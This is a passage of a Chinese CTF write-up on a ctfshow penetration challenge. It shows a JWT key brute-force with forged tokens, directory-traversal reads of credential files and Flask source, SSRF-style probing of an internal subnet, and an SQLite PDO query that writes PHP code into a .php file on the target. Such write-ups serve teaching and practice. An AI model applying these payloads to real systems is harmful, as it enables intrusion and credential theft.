class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>modified_key<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>爆出key：<code>4a4f7d6e8b5e3a0c7f</code></p><p>token：<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkeWxhbiIsImV4cCI6MTczNTk4NTEwNn0.7lqthRIUXMlHFLv8J25BF2qzoMn6EbXaJHeLLKuy6VI</code></p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkeWxhbiIsImV4cCI6MTczNjA4NTIwOH0.qCHIJugF1Q4TQexDG_vydZbJhUPz9WWXs4_ikK9pagI</p><p>访问 &#x2F;getPhone 接口拿到 dylan 的电话号码</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103181859746.png" alt="image-20250103181859746"></p><p>flag：<code>ctfshow&#123;117447685307&#125;</code></p><hr><h2 id="收集敌方身份信息"><a href="#收集敌方身份信息" class="headerlink" title="收集敌方身份信息"></a>收集敌方身份信息</h2><p>以 dylan 身份过一遍接口</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103182341919.png" alt="image-20250103182341919"></p><p>那么 dylan 的账密为<code>dylan:8f7a55c6d9a7d9a7</code></p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103182223469.png" alt="image-20250103182223469"></p><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>使用 <code>/listTaskFiles?path</code>遍历目录，发现不能目录穿越，测了一下把 <code>/</code> 和 <code>\</code> ban了，但是<code>..</code>能用</p><p>使用 <code>/readTaskFile?path=&amp;file_name=</code> 读取文件，同样有上面的waf，而且还ban了app.py</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103182732770.png" alt="image-20250103182732770"></p><h3 id="init-users-json"><a href="#init-users-json" class="headerlink" title="init_users.json"></a>init_users.json</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"hsinchug_wp1"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"hsinchug_wp1"</span><span class="token punctuation">,</span>        <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"Q.4Vyj8VCiedX1KYU5g05"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"dylan"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"dylan"</span><span class="token punctuation">,</span>        <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"8f7a55c6d9a7d9a7"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"secret_user"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"root"</span><span class="token punctuation">,</span>        <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"7y.(sc#Ac_"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag：<code>ctfshow&#123;7y.(sc#Ac_&#125;</code></p><h3 id="main-py-bak"><a href="#main-py-bak" class="headerlink" title="main.py.bak"></a>main.py.bak</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> session<span class="token keyword">from</span> flask <span class="token keyword">import</span> url_for<span class="token keyword">from</span> flask <span class="token keyword">import</span> redirect<span class="token keyword">import</span> logging<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> basename<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> joinapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log server is running'</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">check_session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'user'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/key'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/log_server_key.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            key <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token string">'key'</span><span class="token punctuation">:</span> key<span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/set_log_option'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_log_option</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    logName <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logName'</span><span class="token punctuation">)</span>    logFile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logFile'</span><span class="token punctuation">)</span>    app_log <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span>logName<span class="token punctuation">)</span>    app_log<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>FileHandler<span class="token punctuation">(</span><span class="token string">'./log/'</span> <span class="token operator">+</span> logFile<span class="token punctuation">)</span><span class="token punctuation">)</span>    app_log<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>    clear_log_file<span class="token punctuation">(</span><span class="token string">'./log/'</span> <span class="token operator">+</span> logFile<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log option set successfully'</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/get_log_content'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_log_content</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    logFile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logFile'</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token string">'log'</span><span class="token punctuation">,</span> basename<span class="token punctuation">(</span>logFile<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log content'</span><span class="token punctuation">,</span> <span class="token string">'content'</span><span class="token punctuation">:</span> content<span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">clear_log_file</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="requirements-txt"><a href="#requirements-txt" class="headerlink" title="requirements.txt"></a>requirements.txt</h3><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">annotated-types==0.6.0anyio==4.3.0bcrypt==4.2.1black==24.10.0blinker==1.8.2certifi==2024.2.2cffi==1.17.1charset-normalizer==3.3.2click==8.1.7colorama==0.4.6cos-python-sdk-v5==1.9.33crcmod==1.7cryptography==44.0.0dnspython==2.6.1docutils==0.21.2email_validator==2.1.1fastapi==0.115.6fastapi-cli==0.0.3Flask==3.0.3greenlet==3.0.3h11==0.14.0httpcore==1.0.5httptools==0.6.1httpx==0.27.0idna==3.6itsdangerous==2.2.0jaraco.classes==3.4.0jaraco.context==6.0.1jaraco.functools==4.1.0Jinja2==3.1.4keyring==25.5.0markdown-it-py==3.0.0MarkupSafe==2.1.5mdurl==0.1.2more-itertools==10.5.0mypy-extensions==1.0.0nh3==0.2.20orjson==3.10.3packaging==24.2passlib==1.7.4pathspec==0.12.1pkginfo==1.12.0platformdirs==4.3.6pycparser==2.22pycryptodome==3.21.0pydantic==2.7.1pydantic_core==2.18.2Pygments==2.18.0PyJWT==2.10.1PyMySQL==1.1.0python-dotenv==1.0.1python-multipart==0.0.9pywin32-ctypes==0.2.3PyYAML==6.0.1readme_renderer==44.0requests==2.31.0requests-toolbelt==1.0.0rfc3986==2.0.0rich==13.7.1secretMessageResponse==2.0.17setuptools==75.6.0shellingham==1.5.4six==1.17.0sniffio==1.3.1SQLAlchemy==2.0.30sqlmodel==0.0.22starlette==0.41.3tencentcloud-sdk-python==3.0.1145twine==6.0.1typer==0.12.3typing_extensions==4.11.0ujson==5.10.0urllib3==2.2.1uvicorn==0.29.0watchfiles==0.21.0websockets==12.0Werkzeug==3.0.3xmltodict==0.14.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103184410216.png" alt="image-20250103184410216"></p><p>这里都是实体类没东西</p><hr><h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><p>在 &#x2F;downloadTaskFile 这里测试前面 &#x2F;getServerInfo 接口获取的 ip c段，测出内网php服务</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103185859314.png" alt="image-20250103185859314"></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"success"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token property">"url"</span><span class="token operator">:</span><span class="token string">"http://172.2.240.5"</span><span class="token punctuation">,</span><span class="token property">"file_content"</span><span class="token operator">:</span><span class="token string">"\n&lt;!DOCTYPE html lang=\"en\">\n\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    &lt;title>Database TEST&lt;/title>\n\t&lt;script>\n\t\tconst DATABASE_SECRET_KEY = '0x8F7C71E8E82E4D1E';\n\t&lt;/script>\n&lt;/head>\n\n&lt;body>\n    &lt;h1>Welcome to Database TEST&lt;/h1>\n    &lt;p>This is a test page for database connection and queries.&lt;/p>\n    &lt;form action=\"index.php\" method=\"get\">\n        &lt;label for=\"name\">Enter Database username:&lt;/label>\n        &lt;input type=\"text\" id=\"name\" name=\"username\" required>\n        &lt;br>&lt;br>\n        &lt;label for=\"password\">Enter Database password:&lt;/label>\n        &lt;input type=\"password\" id=\"password\" name=\"password\" required>\n        &lt;br>&lt;br>\n        &lt;label for=\"dsn\">Enter Database DSN:&lt;/label>\n        &lt;input type=\"text\" id=\"dsn\" name=\"dsn\" required>\n        &lt;br>&lt;br>\n        &lt;label for=\"query\">Enter TEST Query:&lt;/label>\n        &lt;input type=\"text\" id=\"query\" name=\"query\" required>\n        &lt;br>&lt;br>\n        &lt;input type=\"submit\" value=\"Submit\">\n    &lt;/form>\n&lt;/body>\n\n&lt;html>\n\n\n"</span><span class="token punctuation">,</span><span class="token property">"request_headers"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"User-Agent"</span><span class="token operator">:</span><span class="token string">"python-requests/2.31.0"</span><span class="token punctuation">,</span><span class="token property">"Accept-Encoding"</span><span class="token operator">:</span><span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span><span class="token property">"Accept"</span><span class="token operator">:</span><span class="token string">"*/*"</span><span class="token punctuation">,</span><span class="token property">"Connection"</span><span class="token operator">:</span><span class="token string">"keep-alive"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"response_headers"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"Server"</span><span class="token operator">:</span><span class="token string">"nginx/1.14.2"</span><span class="token punctuation">,</span><span class="token property">"Date"</span><span class="token operator">:</span><span class="token string">"Fri, 03 Jan 2025 10:57:34 GMT"</span><span class="token punctuation">,</span><span class="token property">"Content-Type"</span><span class="token operator">:</span><span class="token string">"text/html; charset=UTF-8"</span><span class="token punctuation">,</span><span class="token property">"Transfer-Encoding"</span><span class="token operator">:</span><span class="token string">"chunked"</span><span class="token punctuation">,</span><span class="token property">"Connection"</span><span class="token operator">:</span><span class="token string">"keep-alive"</span><span class="token punctuation">,</span><span class="token property">"X-Powered-By"</span><span class="token operator">:</span><span class="token string">"PHP/7.2.24"</span><span class="token punctuation">,</span><span class="token property">"Content-Encoding"</span><span class="token operator">:</span><span class="token string">"gzip"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag：<code>ctfshow&#123;0x8F7C71E8E82E4D1E&#125;</code></p><p>还测出前面源码 8888 端口的flask：（ip不一样因为重启了靶机）</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103195415832.png" alt="image-20250103195415832"></p><p>还测出一个 jetty 服务</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250104002347581.png" alt="image-20250104002347581"></p><p>还有一个 172.2.xxx.2:7400 的服务，返回401，估计是控制环境用的</p><hr><h1 id="第三章（PHP）"><a href="#第三章（PHP）" class="headerlink" title="第三章（PHP）"></a>第三章（PHP）</h1><h2 id="跳岛战术"><a href="#跳岛战术" class="headerlink" title="跳岛战术"></a>跳岛战术</h2><p>跳岛战术，指直接跳过这题打后面几道非预期（</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103190127370.png" alt="image-20250103190127370"></p><p>php服务器 172.2.xxx.5</p><p>观察一下前面得到的html</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span> <span class="token name">lang=</span><span class="token string">"en"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Database TEST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">        <span class="token keyword">const</span> <span class="token constant">DATABASE_SECRET_KEY</span> <span class="token operator">=</span> <span class="token string">'0x8F7C71E8E82E4D1E'</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Welcome to Database TEST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>This is a test page for database connection and queries.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter Database username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter Database password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter Database DSN:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsn<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsn<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter TEST Query:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试发现 config.php 和 index.php 在同一个目录</p><p>hint：</p><blockquote><p>&amp;<br>sqlite是可以不用账号密码的<br>必须有真实的表结构，才能文件落地</p></blockquote><p>本地写一个pdo查询测一下</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">?dsn&#x3D;sqlite:test.php&amp;query&#x3D;CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY,&#39;&lt;?php phpinfo();?&gt;&#39; TEXT NOT NULL,email TEXT NOT NULL,created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250105191146898.png" alt="image-20250105191146898"></p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250105191653338.png" alt="image-20250105191653338"></p><p>能写，接下来尝试打远程</p><p>需要url编码：</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">index.php?dsn&#x3D;sqlite:user.php%26query&#x3D;CREATE%20TABLE%20users(id%20INTEGER%20PRIMARY%20KEY,user%20TEXT%20NOT%20NULL);<span aria-hidden="true" 